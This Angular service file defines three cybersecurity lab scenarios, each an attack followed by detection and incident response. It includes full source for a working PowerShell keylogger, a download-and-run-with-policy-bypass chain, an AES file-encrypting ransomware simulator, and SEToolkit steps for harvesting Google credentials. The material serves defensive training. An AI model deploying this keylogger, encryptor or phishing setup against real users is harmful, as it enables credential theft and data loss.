import { Injectable } from '@angular/core';
import { Scenario } from './home/home';
import axios from 'axios';

@Injectable({
  providedIn: 'root'
})
export class ScenarioService {

  scenarios: (Scenario & { steps: { id: number, title: string, description: string, completed: boolean }[] })[] = [
  {
    id: 'ps-keylogger-splunk',
    title: 'PowerShell Keylogger: Attack, Detect & Respond',
    description: `Simulate a PowerShell-based keylogger from Kali to a Windows victim, then detect and alert using Splunk and perform incident response.
    
This scenario demonstrates the full attack chain: initial compromise, payload delivery, execution, detection via SIEM (Splunk), and a guided incident response workflow. You'll learn how attackers use PowerShell for stealthy keylogging, how defenders can spot script block logging events, and how to contain and eradicate the threat. The lab is mapped to MITRE ATT&CK T1056 (Input Capture) and T1086 (PowerShell). Ideal for endpoint security and SIEM analysts.`,
    time: 45,
    difficulty: 'Medium',
    locked: false,
    category: 'Endpoint + SIEM',
    stars: 4,
    completedBy: 0,
    steps: [
      {
        id: 1,
        title: '🎯 Objective',
        description: `Simulate a PowerShell-based keylogger attack from Kali (10.0.0.6) to a Windows victim, detect it in Splunk, and walk through containment, eradication, and recovery.`,
        completed: false
      },

      // ========== 1️⃣ Attacker (Kali: 10.0.0.6) ==========
      {
        id: 2,
        title: 'Kali: Start HTTP server',
        description: `On Kali, host a simple web server to serve the payload:\n\ncd /var/www/html\npython3 -m http.server 1234`,
        completed: false
      },
      {
        id: 3,
        title: 'Kali: Place keylogger.ps1',
        description: `Copy keylogger.ps1 into /var/www/html so it’s reachable at http://10.0.0.6:1234/keylogger.ps1`,
        completed: false
      },
      {
        id: 4,
        title: 'keylogger.ps1 (full content)',
        description: `PowerShell script used for simulation (educational use only):

\`\`\`powershell
# PowerShell Keylogger for Simulated Test Environments
# WARNING: This script is for educational and authorized testing purposes ONLY.
# Unauthorized use of this script on any system is illegal.

# --- Configuration ---
# Define the path for the log file in the system's temporary directory.
$logFile = Join-Path $env:TEMP "keylog.txt"

# --- Setup ---
# Create the log file if it doesn't exist.
if (-not (Test-Path $logFile)) {
    New-Item -Path $logFile -ItemType File | Out-Null
}

# Add the necessary .NET assembly to translate key codes into readable characters.
Add-Type -AssemblyName System.Windows.Forms

# Define the C# signature for the GetAsyncKeyState function from user32.dll.
$Win32Async = Add-Type -MemberDefinition '[System.Runtime.InteropServices.DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);' -Name "Win32Async" -Namespace "Win32" -PassThru

# --- Main Loop ---
# This infinite loop continuously checks for key presses.
Write-Host "Keylogger started. Press Ctrl+C in this console to stop."
while ($true) {
    # Pause for a very short duration to prevent high CPU usage.
    Start-Sleep -Milliseconds 20

    # Iterate through all possible virtual key codes (1 to 254).
    foreach ($keyCode in 1..254) {
        
        # Check if the key was just pressed.
        if (($Win32Async::GetAsyncKeyState($keyCode)) -eq -32767) {
            
            # Convert the integer key code to its corresponding .NET Keys enumeration.
            $key = [System.Windows.Forms.Keys]$keyCode
            $output = ""

            # --- Key Formatting ---
            # Translate the key code into a user-friendly string.
            switch ($key) {
                "Return"      { $output = "[ENTER]" }
                "Space"       { $output = " " }
                "ShiftKey"    { $output = "" } # Ignored to avoid double logging with L/R Shift
                "LShiftKey"   { $output = "[SHIFT]" }
                "RShiftKey"   { $output = "[SHIFT]" }
                "ControlKey"  { $output = "" } # Ignored to avoid double logging with L/R Ctrl
                "LControlKey" { $output = "[CTRL]" }
                "RControlKey" { $output = "[CTRL]" }
                "Menu"        { $output = "[ALT]" }
                "LMenu"       { $output = "[LALT]" }
                "RMenu"       { $output = "[RALT]" }
                "Tab"         { $output = "[TAB]" }
                "Back"        { $output = "[BACKSPACE]" }
                "Capital"     { $output = "[CAPS_LOCK]" }
                "Escape"      { $output = "[ESC]" }
                "Delete"      { $output = "[DEL]" }
                "Up"          { $output = "[UP_ARROW]" }
                "Down"        { $output = "[DOWN_ARROW]" }
                "Left"        { $output = "[LEFT_ARROW]" }
                "Right"       { $output = "[RIGHT_ARROW]" }
                "NumPad0"     { $output = "0" }
                "NumPad1"     { $output = "1" }
                "NumPad2"     { $output = "2" }
                "NumPad3"     { $output = "3" }
                "NumPad4"     { $output = "4" }
                "NumPad5"     { $output = "5" }
                "NumPad6"     { $output = "6" }
                "NumPad7"     { $output = "7" }
                "NumPad8"     { $output = "8" }
                "NumPad9"     { $output = "9" }
                "Decimal"     { $output = "." }
                "Add"         { $output = "+" }
                "Subtract"    { $output = "-" }
                "Multiply"    { $output = "*" }
                "Divide"      { $output = "/" }
                default {
                    if ($key.ToString().Length -eq 1) {
                        $output = $key.ToString()
                    }
                    elseif ($key.ToString().StartsWith("F")) {
                        $output = "[$($key.ToString())]"
                    }
                }
            }

            # Append the captured key to the log file if it's not an empty string.
            if (-not [string]::IsNullOrEmpty($output)) {
                # Get the current timestamp.
                $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                # Create the log entry with the timestamp.
                $logEntry = "[$timestamp] $output"
                # Write the entry to the log file.
                Add-Content -Path $logFile -Value $logEntry
            }
        }
    }
}
          \`\`\``,
          completed: false
        },

        // ========== 2️⃣ Victim (Windows) ==========
        {
          id: 5,
          title: 'Windows: Download payload',
          description: `Run in PowerShell as victim user:\n\nInvoke-WebRequest -Uri "http://10.0.0.6:1234/keylogger.ps1" -OutFile "C:\\Users\\victim\\Desktop\\keylogger.ps1"`,
          completed: false
        },
        {
          id: 6,
          title: 'Windows: Execute payload',
          description: `Start the keylogger bypassing policy:\n\npowershell.exe -ExecutionPolicy Bypass -File C:\\Users\\victim\\Desktop\\keylogger.ps1`,
          completed: false
        },
        {
          id: 7,
          title: 'Windows: Verify keylog output',
          description: `Confirm output is written to:\n\nC:\\Users\\victim\\AppData\\Local\\Temp\\keylog.txt`,
          completed: false
        },

        // ========== 3️⃣ Detection in Splunk ==========
        {
          id: 8,
          title: 'Splunk: Start service',
          description: `If stopped, start Splunk on Windows:\n\n"& \\"C:\\\\Program Files\\\\Splunk\\\\bin\\\\splunk.exe\\" start"\n\nLogin → user: admin / pass: admin`,
          completed: false
        },
        {
          id: 9,
          title: 'Splunk: Search for PS script blocks',
          description: `Run this search to find suspicious use:\n\nsource="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104 ("keylogger.ps1" OR "keylog.txt" OR "Out-File" OR "Start-Sleep")\n\nYou should see events referencing the keylogger.`,
          completed: false
        },
        {
          id: 10,
          title: 'Splunk: Create alert',
          description: `Save the search as:\n\nName: PowerShell Keylogger Detection\nType: Alert → Trigger: Per-Result\nAction: Send Email (configure SMTP) or Add to Triggered Alerts`,
          completed: false
        },

        // ========== 4️⃣ Incident Response ==========
        {
          id: 11,
          title: 'IR: Containment',
          description: `Terminate malicious PowerShell and isolate if needed:\n\nStop-Process -Name powershell -Force\n(Optionally disconnect the host from the network)`,
          completed: false
        },
        {
          id: 12,
          title: 'IR: Eradication',
          description: `Remove artifacts and check persistence:\n\nRemove-Item "C:\\\\Users\\\\victim\\\\Desktop\\\\keylogger.ps1" -Force\nRemove-Item "C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\Temp\\\\keylog.txt" -Force\nInspect Scheduled Tasks and Run keys for persistence`,
          completed: false
        },
        {
          id: 13,
          title: 'IR: Recovery',
          description: `Reboot the system and re-enable security controls (ExecutionPolicy, Defender, etc.).`,
          completed: false
        },
        {
          id: 14,
          title: 'IR: Lessons Learned',
          description: `Educate users about risky scripts. Continue to monitor PowerShell Event ID 4104 (script block logging) and Sysmon Event ID 1 (process creation).`,
          completed: false
        }
      ],


    },
    // 🆕 2nd Scenario: Ransomware Simulation (PowerShell)
    {
      id: 'ransomware-ps-simulator',
      title: 'Ransomware Simulator (PowerShell): Encrypt, Investigate, Recover',
      description: `Simulate MITRE ATT&CK T1486 (Data Encrypted for Impact) in a safe lab. Encrypt sample files, locate the AES key, and recover the data while practicing IR.
    
This hands-on scenario lets you experience a ransomware attack without real risk. You'll use a custom PowerShell script to encrypt files, drop a ransom note, and then walk through the investigation and recovery process. The lab covers key IR phases: detection, investigation, containment, eradication, and recovery. You'll learn how to identify ransomware artifacts, locate encryption keys, and restore data. Perfect for SOC analysts and incident responders.`,
      time: 35,
      difficulty: 'Medium',
      locked: false,
      category: 'Malware & Incident Response',
      stars: 4,
      completedBy: 0,
      steps: [
        {
          id: 1,
          title: '🎯 Objective',
          description: `Simulate a ransomware attack in a safe environment using a custom PowerShell script, then perform incident response by investigating, locating the encryption key, and recovering the files.\n\nMITRE ATT&CK: T1486 – Data Encrypted for Impact`,
          completed: false
        },
        {
          id: 2,
          title: '🛠 Preconfigured Lab Setup',
          description: `On the Victim VM (Windows) Desktop, you already have:\n\n\`\`\`\nC:\\Users\\victim\\Desktop\\Ransomware_Scenario\n│   Safe_Ransom.ps1          ← PowerShell script (attack & recovery)\n│\n└───Test_Files\n       doc1.txt               ← sample plaintext file\n       doc2.txt               ← sample plaintext file\n\`\`\`\n• Safe_Ransom.ps1 = simulator script\n• Test_Files = preloaded victim files`,
          completed: false
        },
        {
          id: 3,
          title: 'Safe_Ransom.ps1 (full script)',
          description: `\`\`\`powershell
param(
    [string]$Mode = "Encrypt"
)

# ========================
# CONFIG
# ========================
$TargetFolder = "$PSScriptRoot\\Test_Files"
$KeyFile      = "C:\\Temp\\SafeRansom_Key.json"
$RansomNote   = "README_RECOVER.txt"
$SimLog       = "_SimLog.txt"

# ========================
# FUNCTIONS
# ========================
function Get-RandomAES {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.GenerateKey()
    $aes.GenerateIV()
    return @{ Key = $aes.Key; IV = $aes.IV }
}

function Save-Key($key,$iv) {
    $obj = [PSCustomObject]@{
        Key = [System.Convert]::ToBase64String($key)
        IV  = [System.Convert]::ToBase64String($iv)
    }
    $json = $obj | ConvertTo-Json -Depth 3
    New-Item -ItemType Directory -Force -Path (Split-Path $KeyFile) | Out-Null
    Set-Content -Path $KeyFile -Value $json -Encoding UTF8
}

function Load-Key {
    if (!(Test-Path $KeyFile)) { throw "Key file not found at $KeyFile" }
    $json = Get-Content $KeyFile -Raw | ConvertFrom-Json
    return @{
        Key = [System.Convert]::FromBase64String($json.Key)
        IV  = [System.Convert]::FromBase64String($json.IV)
    }
}

function Encrypt-File($file,$key,$iv) {
    $plain = Get-Content $file -Raw
    $aes   = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key; $aes.IV = $iv
    $enc = $aes.CreateEncryptor()
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plain)
    $cipher = $enc.TransformFinalBlock($bytes,0,$bytes.Length)
    $outFile = "$file.enc"
    [System.IO.File]::WriteAllBytes($outFile,$cipher)
    Remove-Item $file
}

function Decrypt-File($file,$key,$iv) {
    $cipher = [System.IO.File]::ReadAllBytes($file)
    $aes    = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key; $aes.IV = $iv
    $dec = $aes.CreateDecryptor()
    $plain = $dec.TransformFinalBlock($cipher,0,$cipher.Length)
    $outFile = $file -replace '\\.enc$',''
    [System.Text.Encoding]::UTF8.GetString($plain) | Out-File $outFile -Encoding utf8
    Remove-Item $file
}

# ========================
# MAIN
# ========================
if ($Mode -eq "Encrypt") {
    Write-Host ">>> Encrypting files inside $TargetFolder ..."

    $keys = Get-RandomAES
    Save-Key $keys.Key $keys.IV

    $files = Get-ChildItem $TargetFolder -File -Recurse | Where-Object { $_.Extension -ne ".enc" }
    foreach ($f in $files) { Encrypt-File $f.FullName $keys.Key $keys.IV }

    # Drop ransom note + log inside victim folder
    $notePath = Join-Path $TargetFolder $RansomNote
@"
ALL YOUR FILES HAVE BEEN ENCRYPTED
---------------------------------
To recover them, you must find the secret key.
(Hint for training: Analysts often check C:\\Temp)

This is only a simulation. No real damage has been done.
"@ | Out-File $notePath -Encoding utf8

    $logPath = Join-Path $TargetFolder $SimLog
    "Encryption complete at $(Get-Date)" | Out-File $logPath -Encoding utf8

    Write-Host ">>> Encryption simulation complete. Key saved at $KeyFile"
}
elseif ($Mode -eq "Decrypt") {
    Write-Host ">>> Decrypting files inside $TargetFolder ..."

    $keys = Load-Key
    $files = Get-ChildItem $TargetFolder -File -Recurse | Where-Object { $_.Extension -eq ".enc" }
    foreach ($f in $files) { Decrypt-File $f.FullName $keys.Key $keys.IV }

    # Clean up ransom note + log
    Remove-Item (Join-Path $TargetFolder $RansomNote) -ErrorAction SilentlyContinue
    Remove-Item (Join-Path $TargetFolder $SimLog) -ErrorAction SilentlyContinue

    Write-Host ">>> Decryption complete. Files restored."
}
else {
    Write-Host "Usage: powershell -ExecutionPolicy Bypass -File .\\Safe_Ransom.ps1 -Mode Encrypt|Decrypt"
}
\`\`\``,
          completed: false
        },
        // ---- Attack Phase (Encryption) ----
        {
          id: 4,
          title: '🚀 Attack: Navigate to folder',
          description: 'Open PowerShell and run:\n\ncd C:\\Users\\victim\\Desktop\\Ransomware_Scenario',
          completed: false
        },
        {
          id: 5,
          title: 'Run Encrypt mode',
          description: 'Execute:\n\npowershell -ExecutionPolicy Bypass -File .\\Safe_Ransom.ps1 -Mode Encrypt',
          completed: false
        },
        {
          id: 6,
          title: 'Verify encrypted outputs',
          description: 'Check Test_Files contents:\n\n```\nTest_Files\n  doc1.txt.enc\n  doc2.txt.enc\n  README_RECOVER.txt   ← ransom note\n  _SimLog.txt          ← simulation log\n```\n\nKey + IV stored at: C:\\Temp\\SafeRansom_Key.json',
          completed: false
        },

        // ---- IR Phase ----
        {
          id: 7,
          title: '🕵 Detection',
          description: 'Open README_RECOVER.txt in Test_Files and confirm original files now have .enc extension.',
          completed: false
        },
        {
          id: 8,
          title: '🔎 Investigation: Locate key',
          description: 'View the key file and parse JSON:\n\nGet-Content C:\\Temp\\SafeRansom_Key.json\n\n$keyData = Get-Content C:\\Temp\\SafeRansom_Key.json -Raw | ConvertFrom-Json\n$keyData',
          completed: false
        },
        {
          id: 9,
          title: '🛡 Containment',
          description: 'Preserve artifacts (ransom note + key JSON). Optionally restrict script execution to prevent further impact (e.g., tighten policy/AppLocker) while keeping the lab intact.',
          completed: false
        },
        {
          id: 10,
          title: '🔧 Recovery: Decrypt files',
          description: 'Run the script to restore data:\n\npowershell -ExecutionPolicy Bypass -File .\\Safe_Ransom.ps1 -Mode Decrypt',
          completed: false
        },
        {
          id: 11,
          title: '✅ Verify restoration',
          description: 'Test_Files should be back to:\n\n```\nTest_Files\n  doc1.txt\n  doc2.txt\n```\nRansom note and log are removed.',
          completed: false
        },
        {
          id: 12,
          title: '📘 Lessons Learned',
          description: '• Ransomware encrypts files and leaves a note\n• IR analysts hunt for keys to restore data\n• In this lab, key is at C:\\Temp\\SafeRansom_Key.json\n• Demonstrates end‑to‑end IR safely',
          completed: false
        }
      ]
    },

    //scenario 3
    {
      id: 'phishing-google-harvester',
      title: 'Phishing (Credential Harvester – Google Template)',
      description: `Use SEToolkit to clone a Google login page, capture credentials, and run the full incident response workflow in a safe lab.
    
This scenario simulates a real-world phishing attack using SEToolkit on Kali Linux. You'll clone a Google login page, lure a victim, and capture credentials. The lab guides you through detection (browser history, DNS cache), containment (firewall rules), eradication (cache cleanup), recovery (password reset, MFA), and documentation. Mapped to MITRE ATT&CK T1566 (Phishing) and T1114 (Email Collection). Great for blue teamers, user awareness training, and IR practice.`,
      time: 35,
      difficulty: 'Easy',
      locked: false,
      category: 'Social Engineering',
      stars: 4,
      completedBy: 0,
      steps: [
        {
          id: 1,
          title: '🎯 Objective',
          description: `Simulate a Google credential-harvesting phishing attack with SEToolkit and practice the full IR workflow (detection, containment, eradication, recovery, documentation).`,
          completed: false
        },
        {
          id: 2,
          title: 'Lab Setup',
          description: `Attacker: Kali with SEToolkit. Victim: Windows 10/11. Same private network.\nExample IPs → Attacker: 10.0.0.6, Victim: 192.168.100.3`,
          completed: false
        },

        // --- Attack Execution (Kali) ---
        {
          id: 3,
          title: 'Kali: Launch SEToolkit',
          description: 'Run:\n\nsudo setoolkit',
          completed: false
        },
        {
          id: 4,
          title: 'Kali: Menu Path',
          description: 'Choose:\n1) Social-Engineering Attacks →\n2) Website Attack Vectors →\n3) Credential Harvester Attack Method →\n1) Web Templates',
          completed: false
        },
        {
          id: 5,
          title: 'Kali: Select Google template',
          description: 'When prompted, select the Google template.',
          completed: false
        },
        {
          id: 6,
          title: 'Kali: Enter Host IP',
          description: 'Enter attacker IP (e.g., 10.0.0.6). The fake page will be served at http://10.0.0.6',
          completed: false
        },
        {
          id: 7,
          title: 'Kali: Credential Storage',
          description: 'Captured credentials are saved under: /root/.set/reports/',
          completed: false
        },

        // --- Victim Activity (Windows) ---
        {
          id: 8,
          title: 'Victim: Browse to Phish',
          description: 'Open a browser and visit: http://10.0.0.6\nA fake Google login page should load.',
          completed: false
        },
        {
          id: 9,
          title: 'Victim: Credential Entry',
          description: 'Enter test creds to simulate compromise. Observe attacker console reporting credentials in real time.',
          completed: false
        },

        // --- Incident Response Workflow ---
        {
          id: 10,
          title: 'IR: 🔎 Detection',
          description: `User report + analyst checks:\n• Browser history (Ctrl+H) → look for http://10.0.0.6\n• Hosts file: C:\\Windows\\System32\\drivers\\etc\\hosts (ensure no fake google.com)\n• DNS cache: ipconfig /displaydns (check suspicious resolutions)`,
          completed: false
        },
        {
          id: 11,
          title: 'IR: 🛡 Containment',
          description: `Block attacker IP on Windows:\n\nNew-NetFirewallRule -DisplayName "Block Phishing IP" -Direction Outbound -RemoteAddress 10.0.0.6 -Action Block\n\nVerify the site is no longer reachable.`,
          completed: false
        },
        {
          id: 12,
          title: 'IR: 🧹 Eradication',
          description: `• ipconfig /flushdns\n• Clear browser cache/history\n• Delete phishing email (if used)\n• AV scan to confirm no malware was downloaded`,
          completed: false
        },
        {
          id: 13,
          title: 'IR: 🔧 Recovery',
          description: `• Reset Google account password\n• Enable MFA\n• Verify access via https://accounts.google.com`,
          completed: false
        },
        {
          id: 14,
          title: 'IR: 📘 Lessons Learned',
          description: `• Check URLs before entering creds\n• Enforce MFA\n• Add URL/email filtering\n• Improve user awareness training`,
          completed: false
        },

        // --- Documentation ---
        {
          id: 15,
          title: '📝 Documentation: Incident Report',
          description: `Template fields:\n• Date/Time: 2025-08-18\n• Type: Phishing – Credential Harvester (Google)\n• Attacker IP: 10.0.0.6 | Victim IP: 192.168.100.3\n• IOCs: Browser history http://10.0.0.6, DNS google.com→10.0.0.6\n• Detection: User report + analyst confirmation\n• Containment: Firewall block\n• Eradication: Flush DNS, clear history, remove phish\n• Recovery: Reset password, enable MFA\n• Lessons: Training, MFA, URL filtering`,
          completed: false
        }
      ]
    }





  ];

  constructor() { }
  private baseUrl = 'http://localhost:5000/api'; // Flask backend URL

  getScenario(id: string | null) {
    if (!id) {
      return undefined;
    }
    return this.scenarios.find(s => s.id === id);
  }

  async getStatus() {
    const response = await axios.get(`${this.baseUrl}/health`);
    //console.log('🔄 Status response:', response.data);
    return response.data;
  }


  getAllScenarios() {
    return this.scenarios;
  }
}